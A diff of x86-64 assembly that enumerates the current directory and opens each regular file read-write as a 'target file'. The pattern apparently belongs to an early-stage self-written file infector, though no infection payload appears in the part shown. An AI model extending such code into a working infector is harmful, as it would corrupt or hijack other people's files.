@@ -66,7 +66,7 @@ _start:
 	call dirent
 	call exit
 dirent:
-	push "/tmp/"                                                ; pushing "." to stack (rsp)
+	push "."                                                ; pushing "." to stack (rsp)
 	mov rdi, rsp                                            ; moving "." to rdi
 	mov rsi, O_RDONLY
 	xor rdx, rdx                                            ; not using any flags
@@ -92,15 +92,31 @@ dirent:
 	
 	xor rcx, rcx
 for_each_file:
+	; push rcx
+	; push rdi
+	; push rcx
+	; mov rdi, r14
+	; call puts
+	; pop rcx
+	; pop rdi
 	push rcx
-	push rdi
-	push rcx
-	mov rdi, r14
-	call puts
-	pop rcx
-	pop rdi
 	cmp byte [r15 + 418 + rcx], DT_REG
 	jne .continue
+
+	.open_target_file:
+		lea rdi, [rcx + r15 + 419]
+		call puts                          ; dirent.d_name = [r15 + 419]
+		mov rsi, O_RDWR
+		xor rdx, rdx                                        ; not using any flags
+		mov rax, SYS_OPEN
+		syscall
+
+		cmp rax, 0                                          ; if can't open file, exit now
+		jle .continue
+		mov r9, rax 
+	.close_file:
+		mov rax, SYS_CLOSE                                  ; close source fd in rdi
+		syscall
 	.continue:
 		pop rcx
 		add cx, word [rcx + r15 + 416]
